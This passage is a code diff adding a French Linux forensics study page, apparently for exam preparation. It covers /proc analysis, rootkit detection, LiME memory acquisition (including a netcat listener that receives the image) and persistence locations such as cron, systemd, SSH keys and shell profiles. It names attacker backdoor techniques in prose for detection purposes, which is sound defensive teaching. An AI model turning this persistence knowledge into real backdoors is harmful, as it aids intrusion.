+    <strong>Timestamps du fichier</strong> : <code>stat /etc/cron.d/update</code> → mtime (modification), ctime (changement inode), atime (accès).<br>
+    <strong>Logs syslog/cron</strong> : premier enregistrement de l'exécution dans <code>/var/log/syslog</code>.<br>
+    <strong>Audit log</strong> : si auditd actif, <code>ausearch -f /etc/cron.d/update</code> révèle qui a créé le fichier avec quel UID.<br>
+    <strong>Bash history</strong> : si l'attaquant a opéré en shell interactif, <code>~/.bash_history</code> peut contenir la commande de création.<br>
+    <strong>Attention</strong> : les timestamps peuvent être falsifiés via <code>touch -t</code> — croiser les sources.
+  </div>
+</div>
+</div><!-- /tab-persistance -->
+
+<!-- ══════════════════════════════════════════════
+     TAB 4 — /PROC & MÉMOIRE
+══════════════════════════════════════════════ -->
+<div class="tab-page" id="tab-proc">
+
+<div class="concept-card">
+  <div class="concept-title">⚙️ /proc — Le système de fichiers virtuel de la mémoire</div>
+  <code>/proc/</code> est un <strong>système de fichiers virtuel</strong> qui expose l'état interne du noyau et de chaque processus en temps réel. Il ne réside pas sur disque — il est généré à la volée par le noyau. C'est la <strong>source d'information live la plus précieuse</strong> sur un système en cours d'exécution : commandes complètes, fichiers ouverts, connexions réseau, variables d'environnement, mappings mémoire.
+</div>
+
+<!-- Table /proc/[pid]/ -->
+<div class="sec-title">Anatomie de /proc/[PID]/ — Cliquez sur un fichier pour ses détails</div>
+
+<div class="arch-viz">
+  <div style="background:rgba(48,232,138,.03);border:2px solid rgba(48,232,138,.2);border-radius:12px;padding:1rem;margin-bottom:.5rem">
+    <div style="font-family:var(--mono);font-size:.6rem;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--green);text-align:center;margin-bottom:.75rem">/proc/[PID]/ — Exposition complète d'un processus</div>
+    <div style="display:grid!important;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:.4rem">
+
+      <div style="padding:.55rem .5rem;border-radius:8px;border:1px solid rgba(0,229,204,.35);text-align:center;cursor:pointer;background:rgba(0,229,204,.07);color:var(--cyan);font-size:.7rem;font-weight:600" onclick="showProc('cmdline')">
+        <code style="font-size:.65rem">cmdline</code><br>
+        <span style="font-size:.6rem;opacity:.75">Commande complète</span>
+      </div>
+
+      <div style="padding:.55rem .5rem;border-radius:8px;border:1px solid rgba(240,192,64,.35);text-align:center;cursor:pointer;background:rgba(240,192,64,.07);color:var(--gold);font-size:.7rem;font-weight:600" onclick="showProc('exe')">
+        <code style="font-size:.65rem">exe</code><br>
+        <span style="font-size:.6rem;opacity:.75">Binaire exécuté</span>
+      </div>
+
+      <div style="padding:.55rem .5rem;border-radius:8px;border:1px solid rgba(188,140,255,.35);text-align:center;cursor:pointer;background:rgba(188,140,255,.07);color:var(--purple);font-size:.7rem;font-weight:600" onclick="showProc('maps')">
+        <code style="font-size:.65rem">maps</code><br>
+        <span style="font-size:.6rem;opacity:.75">Zones mémoire</span>
+      </div>
+
+      <div style="padding:.55rem .5rem;border-radius:8px;border:1px solid rgba(255,64,96,.35);text-align:center;cursor:pointer;background:rgba(255,64,96,.07);color:var(--red);font-size:.7rem;font-weight:600" onclick="showProc('environ')">
+        <code style="font-size:.65rem">environ</code><br>
+        <span style="font-size:.6rem;opacity:.75">Variables env.</span>
+      </div>
+
+      <div style="padding:.55rem .5rem;border-radius:8px;border:1px solid rgba(48,232,138,.35);text-align:center;cursor:pointer;background:rgba(48,232,138,.07);color:var(--green);font-size:.7rem;font-weight:600" onclick="showProc('fd')">
+        <code style="font-size:.65rem">fd/</code><br>
+        <span style="font-size:.6rem;opacity:.75">Fichiers ouverts</span>
+      </div>
+
+      <div style="padding:.55rem .5rem;border-radius:8px;border:1px solid rgba(88,166,255,.35);text-align:center;cursor:pointer;background:rgba(88,166,255,.07);color:var(--blue);font-size:.7rem;font-weight:600" onclick="showProc('net')">
+        <code style="font-size:.65rem">net/tcp</code><br>
+        <span style="font-size:.6rem;opacity:.75">Connexions réseau</span>
+      </div>
+
+      <div style="padding:.55rem .5rem;border-radius:8px;border:1px solid rgba(0,229,204,.25);text-align:center;cursor:pointer;background:rgba(0,229,204,.04);color:var(--cyan);font-size:.7rem;font-weight:600" onclick="showProc('status')">
+        <code style="font-size:.65rem">status</code><br>
+        <span style="font-size:.6rem;opacity:.75">UID/GID, état</span>
+      </div>
+
+      <div style="padding:.55rem .5rem;border-radius:8px;border:1px solid rgba(240,192,64,.25);text-align:center;cursor:pointer;background:rgba(240,192,64,.04);color:var(--gold);font-size:.7rem;font-weight:600" onclick="showProc('mem')">
+        <code style="font-size:.65rem">mem</code><br>
+        <span style="font-size:.6rem;opacity:.75">Dump mémoire</span>
+      </div>
+
+    </div>
+  </div>
+</div>
+<div class="arch-detail" id="proc-detail" style="margin-bottom:1rem">
+  <div style="color:var(--dim);font-size:.78rem">ℹ️ Sélectionnez un fichier /proc/[PID]/ pour afficher ses détails forensiques</div>
+</div>
+
+<!-- /proc globaux -->
+<div class="sec-title">/proc/ globaux — informations système live</div>
+<div style="overflow-x:auto">
+<table>
+  <thead><tr><th>Fichier /proc/</th><th>Contenu</th><th>Usage forensique</th></tr></thead>
+  <tbody>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.72rem;color:var(--cyan)">/proc/net/tcp<br>/proc/net/tcp6</td>
+      <td style="font-size:.75rem">Connexions TCP actives (hex). État : 0A=LISTEN, 01=ESTABLISHED, 06=TIME_WAIT.</td>
+      <td style="font-size:.73rem">Identifier connexions suspectes même si <code>ss</code>/<code>netstat</code> sont modifiés par un rootkit.</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.72rem;color:var(--cyan)">/proc/net/unix</td>
+      <td style="font-size:.75rem">Sockets Unix domain (communication inter-processus locale).</td>
+      <td style="font-size:.73rem">C2 fileless peut communiquer via sockets Unix pour éviter le réseau.</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.72rem;color:var(--cyan)">/proc/modules</td>
+      <td style="font-size:.75rem">Modules noyau chargés (= sortie de <code>lsmod</code>).</td>
+      <td style="font-size:.73rem">Rootkits LKM apparaissent ici — ou sont cachés (à comparer avec <code>ls /sys/module/</code>).</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.72rem;color:var(--cyan)">/proc/uptime</td>
+      <td style="font-size:.75rem">Temps de fonctionnement en secondes depuis le démarrage.</td>
+      <td style="font-size:.73rem">Estimer la date de démarrage du système (time_now − uptime).</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.72rem;color:var(--cyan)">/proc/version</td>
+      <td style="font-size:.75rem">Version du noyau, compilateur utilisé, date de compilation.</td>
+      <td style="font-size:.73rem">Identifier la distribution et les vulnérabilités potentielles du noyau.</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.72rem;color:var(--cyan)">/proc/swaps</td>
+      <td style="font-size:.75rem">Partitions/fichiers swap actifs et taille utilisée.</td>
+      <td style="font-size:.73rem">Le swap peut contenir des fragments de mémoire — à acquérir aussi.</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<!-- Acquisition mémoire Linux -->
+<div class="sec-title">⚡ Astuce forensique — fichier supprimé mais processus ouvert</div>
+<div class="alert">
+  💡 Sur Linux, quand un processus ouvre un fichier puis que ce fichier est supprimé (<code>rm</code>), le contenu reste accessible tant que le processus n'est pas arrêté. Chemin : <code>/proc/[PID]/fd/[numéro]</code>. Technique de récupération en temps réel — indépendante du système de fichiers.
+</div>
+<div style="background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:.8rem 1rem;margin:.75rem 0;font-family:var(--mono);font-size:.68rem;line-height:1.9;color:var(--text)">
+  <span style="color:var(--cyan)"># Lister tous les fichiers supprimés encore ouverts</span><br>
+  ls -la /proc/*/fd 2&gt;/dev/null | grep deleted<br><br>
+  <span style="color:var(--cyan)"># Récupérer le contenu d'un fichier supprimé (PID 1234, fd 3)</span><br>
+  cp /proc/1234/fd/3 /evidence/recovered_file<br><br>
+  <span style="color:var(--cyan)"># Voir la commande qui a ouvert ce fichier</span><br>
+  cat /proc/1234/cmdline | tr '\0' ' '
+</div>
+
+<div class="memo-grid">
+  <div class="memo-card">
+    <h4>🔬 Détecter un processus masqué par rootkit</h4>
+    <ul class="memo-list">
+      <li>Comparer <code>ps aux</code> avec <code>ls /proc/ | grep [0-9]</code></li>
+      <li>PID présent dans /proc/ mais absent de ps = rootkit user-space</li>
+      <li><code>/proc/net/tcp</code> vs <code>ss -antp</code> : divergence = hook réseau</li>
+      <li>Outil : <code>unhide</code> (scan brute-force des PIDs 1–65535)</li>
+      <li>Dernier recours : dump mémoire + Volatility (plugins <code>linux_pslist</code> vs <code>linux_psscan</code>)</li>
+    </ul>
+  </div>
+  <div class="memo-card">
+    <h4>📊 Analyse réseau depuis /proc (anti-rootkit)</h4>
+    <ul class="memo-list">
+      <li><code>cat /proc/net/tcp</code> → colonnes : local_addr:port remote_addr:port state uid inode</li>
+      <li>Convertir hex : <code>0A</code> = 10 = port 10 (inverser octets pour l'IP)</li>
+      <li>Croiser inode avec <code>ls -la /proc/*/fd/</code> → retrouver le PID</li>
+      <li>État <code>0A</code> = LISTEN · <code>01</code> = ESTABLISHED · <code>06</code> = TIME_WAIT</li>
+      <li>Comparer avec <code>ss -antp</code> — toute divergence = manipulation</li>
+    </ul>
+  </div>
+</div>
+</div><!-- /tab-proc -->
+
+<!-- ══════════════════════════════════════════════
+     TAB 5 — ACQUISITION
+══════════════════════════════════════════════ -->
+<div class="tab-page" id="tab-acquisition">
+
+<div class="concept-card">
+  <div class="concept-title">💾 Acquisition Linux — Ordre de volatilité (RFC 3227)</div>
+  L'acquisition Linux suit le même principe universel : <strong>du plus volatil au moins volatil</strong>. La mémoire vive disparaît à la mise hors tension. Les logs en RAM (journald /run/) disparaissent aussi. Agir dans l'ordre et documenter chaque action.
+</div>
+
+<!-- Ordre de volatilité -->
+<div class="sec-title">Ordre d'acquisition recommandé</div>
+<div style="border:1px solid var(--border);border-radius:10px;overflow:hidden;margin:.75rem 0">
+  <div style="background:var(--surface2);padding:.45rem .85rem;font-family:var(--mono);font-size:.6rem;font-weight:700;letter-spacing:.09em;text-transform:uppercase;color:var(--dim);border-bottom:1px solid var(--border);display:grid!important;grid-template-columns:60px 180px 1fr 100px">
+    <span>ORDRE</span><span>SOURCE</span><span>CONTENU</span><span>OUTIL</span>
+  </div>
+
+  <div style="display:grid!important;grid-template-columns:60px 180px 1fr 100px;border-bottom:1px solid var(--border)">
+    <div style="padding:.5rem .85rem;font-family:var(--mono);font-size:.7rem;font-weight:700;color:var(--red);border-right:1px solid var(--border);background:rgba(255,64,96,.05)">1 🔴</div>
+    <div style="padding:.5rem .85rem;font-family:var(--mono);font-size:.7rem;border-right:1px solid var(--border);font-weight:600">RAM physique</div>
+    <div style="padding:.5rem .85rem;font-size:.74rem;border-right:1px solid var(--border);color:var(--muted)">Processus actifs, connexions, clés chiffrement, malwares fileless. Disparaît à l'extinction.</div>
+    <div style="padding:.5rem .85rem;font-size:.68rem;color:var(--muted)">LiME, AVML</div>
+  </div>
+
+  <div style="display:grid!important;grid-template-columns:60px 180px 1fr 100px;border-bottom:1px solid var(--border)">
+    <div style="padding:.5rem .85rem;font-family:var(--mono);font-size:.7rem;font-weight:700;color:var(--red);border-right:1px solid var(--border);background:rgba(255,64,96,.05)">2 🔴</div>
+    <div style="padding:.5rem .85rem;font-family:var(--mono);font-size:.7rem;border-right:1px solid var(--border);font-weight:600">/proc/ &amp; /sys/</div>
+    <div style="padding:.5rem .85rem;font-size:.74rem;border-right:1px solid var(--border);color:var(--muted)">État kernel live, modules, connexions, processus. Virtuel — dispaaraît à l'arrêt.</div>
+    <div style="padding:.5rem .85rem;font-size:.68rem;color:var(--muted)">Script bash</div>
+  </div>
+
+  <div style="display:grid!important;grid-template-columns:60px 180px 1fr 100px;border-bottom:1px solid var(--border)">
+    <div style="padding:.5rem .85rem;font-family:var(--mono);font-size:.7rem;font-weight:700;color:var(--gold);border-right:1px solid var(--border);background:rgba(240,192,64,.05)">3 🟡</div>
+    <div style="padding:.5rem .85rem;font-family:var(--mono);font-size:.7rem;border-right:1px solid var(--border);font-weight:600">Journal /run/</div>
+    <div style="padding:.5rem .85rem;font-size:.74rem;border-right:1px solid var(--border);color:var(--muted)">Journal systemd non-persistant (tmpfs). Perdu à l'arrêt si /var/log/journal/ n'existe pas.</div>
+    <div style="padding:.5rem .85rem;font-size:.68rem;color:var(--muted)">journalctl -D</div>
+  </div>
+
+  <div style="display:grid!important;grid-template-columns:60px 180px 1fr 100px;border-bottom:1px solid var(--border)">
+    <div style="padding:.5rem .85rem;font-family:var(--mono);font-size:.7rem;font-weight:700;color:var(--gold);border-right:1px solid var(--border);background:rgba(240,192,64,.05)">4 🟡</div>
+    <div style="padding:.5rem .85rem;font-family:var(--mono);font-size:.7rem;border-right:1px solid var(--border);font-weight:600">Swap</div>
+    <div style="padding:.5rem .85rem;font-size:.74rem;border-right:1px solid var(--border);color:var(--muted)">Fragments mémoire paginés. Peut contenir des secrets, chaînes de commandes, fragments de fichiers.</div>
+    <div style="padding:.5rem .85rem;font-size:.68rem;color:var(--muted)">dd / dcfldd</div>
+  </div>
+
+  <div style="display:grid!important;grid-template-columns:60px 180px 1fr 100px;border-bottom:1px solid var(--border)">
+    <div style="padding:.5rem .85rem;font-family:var(--mono);font-size:.7rem;font-weight:700;color:var(--green);border-right:1px solid var(--border);background:rgba(48,232,138,.05)">5 🟢</div>
+    <div style="padding:.5rem .85rem;font-family:var(--mono);font-size:.7rem;border-right:1px solid var(--border);font-weight:600">Disque complet</div>
+    <div style="padding:.5rem .85rem;font-size:.74rem;border-right:1px solid var(--border);color:var(--muted)">Image bit-à-bit du système. Logs, artefacts, espace non alloué. Source principale hors-ligne.</div>
+    <div style="padding:.5rem .85rem;font-size:.68rem;color:var(--muted)">dd, dcfldd, FTK</div>
+  </div>
+
+  <div style="display:grid!important;grid-template-columns:60px 180px 1fr 100px">
+    <div style="padding:.5rem .85rem;font-family:var(--mono);font-size:.7rem;font-weight:700;color:var(--blue);border-right:1px solid var(--border);background:rgba(88,166,255,.05)">6 🔵</div>
+    <div style="padding:.5rem .85rem;font-family:var(--mono);font-size:.7rem;border-right:1px solid var(--border);font-weight:600">Logs distants / SIEM</div>
+    <div style="padding:.5rem .85rem;font-size:.74rem;border-right:1px solid var(--border);color:var(--muted)">Logs centralisés (rsyslog remote, Splunk, Elastic). Intacts même si la machine est compromise.</div>
+    <div style="padding:.5rem .85rem;font-size:.68rem;color:var(--muted)">SIEM export</div>
+  </div>
+</div>
+
+<!-- LiME -->
+<div class="sec-title">LiME — Linux Memory Extractor</div>
+<div class="alert">
+  🔑 <strong>LiME (Linux Memory Extractor)</strong> est le standard DFIR pour l'acquisition de la RAM Linux. C'est un module noyau (<code>.ko</code>) à charger via <code>insmod</code>. Il doit être compilé pour la version exacte du noyau cible — un LiME compilé pour Ubuntu 22.04 ne fonctionnera pas sur Ubuntu 20.04.
+</div>
+
+<div style="background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:.8rem 1rem;margin:.75rem 0;font-family:var(--mono);font-size:.68rem;line-height:1.9;color:var(--text)">
+  <span style="color:var(--cyan)"># 1. Compiler LiME (sur machine identique ou cross-compile)</span><br>
+  git clone https://github.com/504ensicsLabs/LiME.git &amp;&amp; cd LiME/src &amp;&amp; make<br><br>
+  <span style="color:var(--cyan)"># 2. Acquisition vers fichier local</span><br>
+  insmod lime.ko "path=/mnt/evidence/ram.lime format=lime"<br><br>
+  <span style="color:var(--cyan)"># 3. Acquisition vers réseau (évite d'écrire sur le disque cible)</span><br>
+  insmod lime.ko "path=tcp:4444 format=lime"<br>
+  <span style="color:var(--dim)"># Côté analyste :</span><br>
+  nc -l -p 4444 &gt; ram.lime<br><br>
+  <span style="color:var(--cyan)"># 4. Vérifier l'intégrité</span><br>
+  sha256sum ram.lime &gt; ram.lime.sha256
+</div>
+
+<!-- Outils -->
+<div class="sec-title">Outils forensiques Linux</div>
+<div class="tool-grid">
+
+  <div class="tool-card" style="border-left:3px solid var(--cyan)">
+    <div class="tool-name">LiME</div>
+    <div class="tool-by">504ensics Labs</div>
+    <div class="tool-desc">Module noyau pour acquisition RAM Linux. Format lime compatible Volatility. Référence DFIR.</div>
+    <div><span class="tool-tag tt-free">Gratuit</span><span class="tool-tag tt-cmd">LKM</span></div>
+  </div>
+
+  <div class="tool-card" style="border-left:3px solid var(--green)">
+    <div class="tool-name">Volatility 3</div>
+    <div class="tool-by">Volatility Foundation</div>
+    <div class="tool-desc">Analyse RAM Linux : linux_pslist, linux_netstat, linux_bash, linux_find_file. Profil auto-détecté sur V3.</div>
+    <div><span class="tool-tag tt-free">Gratuit</span><span class="tool-tag tt-cmd">CLI Python</span></div>
+  </div>
+
+  <div class="tool-card" style="border-left:3px solid var(--gold)">
+    <div class="tool-name">The Sleuth Kit (TSK)</div>
+    <div class="tool-by">Brian Carrier</div>
+    <div class="tool-desc">Analyse de systèmes de fichiers Linux (ext2/3/4, XFS, btrfs). <code>fls</code>, <code>icat</code>, <code>ils</code>. Intégré à Autopsy.</div>
+    <div><span class="tool-tag tt-free">Gratuit</span><span class="tool-tag tt-cmd">CLI</span></div>
+  </div>
+
+  <div class="tool-card" style="border-left:3px solid var(--purple)">
+    <div class="tool-name">log2timeline / Plaso</div>
+    <div class="tool-by">Kristinn Gudjonsson</div>
+    <div class="tool-desc">Timeline unifiée depuis sources multiples : auth.log, bash_history, syslog, wtmp, audit.log, filesystem. Output CSV/Excel.</div>
+    <div><span class="tool-tag tt-free">Gratuit</span><span class="tool-tag tt-cmd">CLI Python</span></div>
+  </div>
+
+  <div class="tool-card" style="border-left:3px solid var(--blue)">
+    <div class="tool-name">AVML</div>
+    <div class="tool-by">Microsoft (open source)</div>
+    <div class="tool-desc">Acquisition RAM Linux sans compilation du module noyau — utilise /proc/kcore ou /dev/crash. Alternative si LiME impossible.</div>
+    <div><span class="tool-tag tt-free">Gratuit</span><span class="tool-tag tt-cmd">CLI</span></div>
+  </div>
+
+  <div class="tool-card" style="border-left:3px solid var(--red)">
+    <div class="tool-name">Autopsy</div>
+    <div class="tool-by">Basis Technology</div>
+    <div class="tool-desc">Interface graphique pour analyse d'images disque Linux. Supporte ext4, XFS. Intègre TSK, recherche de hash, timeline.</div>
+    <div><span class="tool-tag tt-free">Gratuit</span><span class="tool-tag tt-gui">GUI</span></div>
+  </div>
+
+</div>
+
+<div class="exam-tip">
+  <div class="exam-tip-title">🎓 Exam Tip — Acquisition Linux</div>
+  <p><strong>LiME</strong> = module noyau (.ko) — doit correspondre exactement à la version du noyau cible</p>
+  <p><strong>Format lime</strong> = format recommandé pour Volatility · <strong>format raw</strong> = dd-compatible</p>
+  <p><strong>Acquisition réseau</strong> (<code>path=tcp:4444</code>) = écriture zéro sur disque cible — préférer cette méthode</p>
+  <p><strong>Avant extinction</strong> : collecter /proc/, RAM, swap, journal /run/ — ils disparaissent</p>
+  <p><strong>Intégrité</strong> : toujours sha256sum avant ET après copie — documenter la chaîne de custody</p>
+</div>
+
+<div class="quiz-wrap">
+  <div class="quiz-q">Un technicien DFIR arrive sur un serveur Linux Ubuntu 22.04 compromis et toujours en ligne. Il dispose d'une clé USB et d'un accès root. Dans quel ordre doit-il procéder pour préserver un maximum de preuves ?<small>Acquisition · Niveau : moyen</small></div>
+  <div class="quiz-actions"><button class="quiz-reveal-btn">Révéler →</button></div>
+  <div class="quiz-answer">
+    <strong>1. Documentation préalable</strong> : photographier l'écran, noter l'heure système, la date, les connexions actives (<code>ss -antp</code>, <code>who</code>, <code>w</code>).<br>
+    <strong>2. Collection /proc/ volatile</strong> : script de triage — sauvegarder <code>ps auxef</code>, <code>netstat -antp</code>, <code>/proc/net/tcp</code>, <code>lsmod</code>, <code>last</code> vers la clé USB.<br>
+    <strong>3. Acquisition RAM</strong> : charger LiME vers la clé USB (<code>insmod lime.ko "path=/mnt/usb/ram.lime format=lime"</code>) ou vers réseau (<code>path=tcp:4444</code>).<br>
+    <strong>4. Journal /run/</strong> : <code>journalctl -D /run/log/journal/ -o export &gt; /mnt/usb/journal_volatile.bin</code><br>
+    <strong>5. Image disque</strong> : <code>dcfldd if=/dev/sda of=/mnt/nas/disk.dd hash=sha256 hashlog=/mnt/nas/disk.sha256</code><br>
+    <strong>6. Hasher tout</strong> et documenter la chaîne de custody avant de quitter la scène.
+  </div>
+</div>
+</div><!-- /tab-acquisition -->
+
+<script>
+// ── Tab switching ──
+function showTab(id, btn) {
+  document.querySelectorAll('.tab-page').forEach(function(p){p.classList.remove('active');});
+  document.querySelectorAll('.tab').forEach(function(b){b.classList.remove('active');});
+  var el = document.getElementById('tab-'+id);
+  if(el) el.classList.add('active');
+  if(btn) btn.classList.add('active');
+}
+
+document.addEventListener('click', function(e) {
+  if(e.target && e.target.classList.contains('quiz-reveal-btn')) {
+    var wrap = e.target.closest('.quiz-wrap');
+    if(!wrap) return;
+    var ans = wrap.querySelector('.quiz-answer');
+    if(ans) ans.style.display = ans.style.display === 'block' ? 'none' : 'block';
+  }
+});
+
+// ── Zone artefacts ──
+var artZones = {
+  user: {
+    icon: '👤',
+    title: '/home/ &amp; /root/ — Artefacts utilisateur',
+    body: `<strong>Shell history</strong> : <code>~/.bash_history</code>, <code>~/.zsh_history</code> — commandes exécutées. HISTFILE=/dev/null = effacement intentionnel.<br><br>
+    <strong>Dotfiles critiques</strong> : <code>~/.bashrc</code>, <code>~/.bash_profile</code>, <code>~/.profile</code> — vecteurs de persistance (alias malveillants, reverse shell au login).<br><br>
+    <strong>SSH</strong> : <code>~/.ssh/authorized_keys</code> (backdoor), <code>~/.ssh/known_hosts</code> (cibles contactées), <code>~/.ssh/config</code> (redirections, proxyjumps).<br><br>
+    <strong>Éditeurs</strong> : <code>~/.viminfo</code>, <code>~/.lesshst</code>, <code>~/.nano_history</code> — fichiers consultés récemment.<br><br>
+    <strong>Corbeille XDG</strong> : <code>~/.local/share/Trash/files/</code> (fichiers) et <code>info/</code> (métadonnées : chemin original + date de suppression).`
+  },
+  logs: {
+    icon: '📋',
+    title: '/var/log/ — Journaux système',
+    body: `<strong>auth.log</strong> : toutes les authentifications SSH, sudo, PAM. Champ clé : "Accepted publickey" / "Failed password" / "sudo : .*COMMAND".<br><br>
+    <strong>syslog / messages</strong> : logs généraux — services, kernel, cron. Sur RHEL/CentOS : /var/log/messages.<br><br>
+    <strong>kern.log</strong> : messages noyau — chargement de modules, USB events, erreurs matérielles. Un module rootkit apparaît ici au chargement.<br><br>
+    <strong>audit/audit.log</strong> : si auditd actif, le log le plus riche. Enregistre chaque execve(), open(), connect(), unlink() avec UID réel.<br><br>
+    <strong>Apache/Nginx</strong> : access.log et error.log — souvent oubliés par les attaquants. Révèle webshells, exploitation de CVE, LFI/RFI.<br><br>
+    <strong>Rotation</strong> : les anciens logs sont compressés (.gz) et numérotés (syslog.1, syslog.2.gz). Ne pas oublier de les analyser.`
+  },
+  etc: {
+    icon: '⚙️',
+    title: '/etc/ — Configuration système',
+    body: `<strong>/etc/passwd</strong> : liste des comptes. UID 0 non-root = backdoor. Shell /bin/bash sur compte service = suspect. Format : user:x:uid:gid:comment:home:shell.<br><br>
+    <strong>/etc/shadow</strong> : hashes de mots de passe (root seul). Algorithme : $6$ = SHA-512, $y$ = yescrypt. Hash identique entre deux comptes = même mot de passe.<br><br>
+    <strong>/etc/sudoers &amp; sudoers.d/</strong> : droits sudo. <code>ALL=(ALL:ALL) NOPASSWD:ALL</code> = accès root sans mot de passe — vecteur d'escalade.<br><br>
+    <strong>/etc/cron*</strong> : crontab système, cron.d/, cron.daily/hourly/weekly. Vérifier les dates de modification des fichiers.<br><br>
+    <strong>/etc/hosts</strong> : redirections DNS locales. Un attaquant peut rediriger des domaines légitimes vers ses serveurs malveillants.<br><br>
+    <strong>/etc/ssh/sshd_config</strong> : configuration SSH. PermitRootLogin yes, AuthorizedKeysFile modifié, Port non-standard.`
+  },
+  tmp: {
+    icon: '⚡',
+    title: '/tmp/ &amp; /dev/shm/ — Zones volatiles',
+    body: `<strong>/tmp/</strong> : effacé au redémarrage (souvent tmpfs en mémoire). Utilisé massivement par les malwares pour déposer des outils (nmap, netcat, compilateurs). Scripts dropper téléchargés ici puis exécutés.<br><br>
+    <strong>/var/tmp/</strong> : persiste entre les redémarrages (contrairement à /tmp). Plus discret pour la persistance temporaire.<br><br>
+    <strong>/dev/shm/</strong> : mémoire partagée (tmpfs). Zone d'exécution de malwares <strong>fileless</strong> — pas de trace sur disque. Contenu en RAM uniquement.<br><br>
+    <strong>Forensique live</strong> : <code>ls -la /tmp/ /var/tmp/ /dev/shm/</code> — chercher exécutables, scripts, binaires avec noms aléatoires.<br><br>
+    <strong>Forensique post-mortem</strong> : /tmp et /dev/shm sont perdus à l'arrêt si tmpfs. /var/tmp peut être récupéré sur image disque. L'absence d'artefacts dans /tmp est normale — leur présence est suspecte.`
+  },
+  proc: {
+    icon: '🔬',
+    title: '/proc/ — Système de fichiers virtuel',
+    body: `<strong>Virtuel</strong> : /proc/ n'existe pas sur disque — généré par le noyau en temps réel. Inutile sur image disque froide.<br><br>
+    <strong>/proc/[PID]/cmdline</strong> : commande complète du processus (args séparés par \0).<br>
+    <strong>/proc/[PID]/exe</strong> : lien symbolique vers le binaire. Si pointe vers un fichier "(deleted)" = binaire supprimé après exécution — technique furtive.<br>
+    <strong>/proc/[PID]/fd/</strong> : tous les fichiers ouverts. Un fichier "(deleted)" encore ouvert = récupérable via <code>cp /proc/[PID]/fd/[N] /evidence/</code>.<br><br>
+    <strong>/proc/net/tcp</strong> : connexions TCP en hexadécimal. Résistant aux rootkits user-space qui modifient <code>netstat</code> ou <code>ss</code>.<br><br>
+    <strong>/proc/modules</strong> : modules noyau chargés. Comparer avec /sys/module/ — divergence = rootkit LKM masqué.`
+  },
+  reseau: {
+    icon: '🌐',
+    title: 'Réseau — Artefacts et analyse',
+    body: `<strong>Commandes live</strong> : <code>ss -antp</code> (sockets), <code>ip route</code> (routes), <code>iptables -L -n</code> (règles firewall), <code>ip neigh</code> (ARP cache).<br><br>
+    <strong>Anti-rootkit</strong> : lire directement <code>/proc/net/tcp</code> au lieu de ss/netstat si un rootkit est suspecté.<br><br>
+    <strong>ARP cache</strong> : <code>/proc/net/arp</code> ou <code>ip neigh</code> — révèle les hôtes récemment contactés sur le réseau local.<br><br>
+    <strong>DNS</strong> : <code>/etc/resolv.conf</code> (serveurs DNS), <code>/etc/hosts</code> (redirections locales). Vérifier si des domaines légitimes sont détournés.<br><br>
+    <strong>Interfaces</strong> : <code>ip addr</code> — interfaces en mode promiscuous (<code>PROMISC</code>) = sniffer actif. Interface inconnue = tunnel ou VPN malveillant.<br><br>
+    <strong>Connexions établies</strong> : <code>ss -antp state established</code> — noter IP distantes, ports, PID associés.`
+  }
+};
+
+function showArtZone(key) {
+  var d = artZones[key];
+  if(!d) return;
+  var p = document.getElementById('art-zone-detail');
+  p.className = 'arch-detail live';
+  p.innerHTML = '<div class="dp-title"><span>'+d.icon+'</span><span>'+d.title+'</span></div><div class="dp-body" style="font-size:.79rem;line-height:1.75;color:var(--muted)">'+d.body+'</div>';
+}
+
+// ── Persistance details ──
+var persistDetails = {
+  cron: {
+    icon: '🕐',
+    name: 'Cron / Crontab',
+    body: `<strong>Emplacements</strong> :<br>
+    · <code>/etc/crontab</code> — crontab système<br>
+    · <code>/etc/cron.d/</code> — fragments de cron système<br>
+    · <code>/etc/cron.daily/</code>, <code>cron.hourly/</code>, <code>cron.weekly/</code><br>
+    · <code>/var/spool/cron/crontabs/[user]</code> — crontab par utilisateur<br><br>
+    <strong>Forensique</strong> : vérifier la date de modification (<code>stat</code>) de chaque fichier. Un <code>cron.d/</code> avec mtime récent = suspect.<br>
+    <strong>Commande</strong> : <code>for u in $(cut -f1 -d: /etc/passwd); do crontab -l -u $u 2>/dev/null; done</code>`
+  },
+  systemd: {
+    icon: '⚙️',
+    name: 'systemd Units',
+    body: `<strong>Emplacements</strong> :<br>
+    · <code>/etc/systemd/system/</code> — services système (root)<br>
+    · <code>/usr/lib/systemd/system/</code> — services distribution<br>
+    · <code>~/.config/systemd/user/</code> — services utilisateur<br><br>
+    <strong>Forensique</strong> : un service .service avec ExecStart pointant vers /tmp/, /dev/shm/ ou un script en base64 = backdoor.<br>
+    <strong>Commandes</strong> :<br>
+    <code>systemctl list-units --type=service</code><br>
+    <code>find /etc/systemd/ -name "*.service" -newer /etc/passwd</code>`
+  },
+  ssh: {
+    icon: '🔑',
+    name: 'SSH authorized_keys',
+    body: `<strong>Chemin</strong> : <code>~/.ssh/authorized_keys</code> (et <code>/root/.ssh/authorized_keys</code>)<br><br>
+    <strong>Mécanisme</strong> : chaque ligne = une clé publique autorisant une connexion sans mot de passe. L'ajout d'une clé = backdoor persistante silencieuse.<br><br>
+    <strong>Forensique</strong> :<br>
+    · <code>find / -name "authorized_keys" -exec ls -la {} \;</code><br>
+    · Comparer le nombre de clés avec les clés attendues<br>
+    · Vérifier les commentaires des clés (souvent email/hostname de l'attaquant)<br>
+    · Contrôler le mtime du fichier et le corréler avec auth.log`
+  },
+  bashrc: {
+    icon: '🐚',
+    name: '.bashrc / .bash_profile / .profile',
+    body: `<strong>Fichiers</strong> : <code>~/.bashrc</code>, <code>~/.bash_profile</code>, <code>~/.profile</code>, <code>~/.zshrc</code>, <code>/etc/profile</code>, <code>/etc/profile.d/*.sh</code><br><br>
+    <strong>Exécution</strong> : à chaque ouverture de shell interactif (bashrc) ou de session login (bash_profile, profile).<br><br>
+    <strong>Techniques malveillantes</strong> :<br>
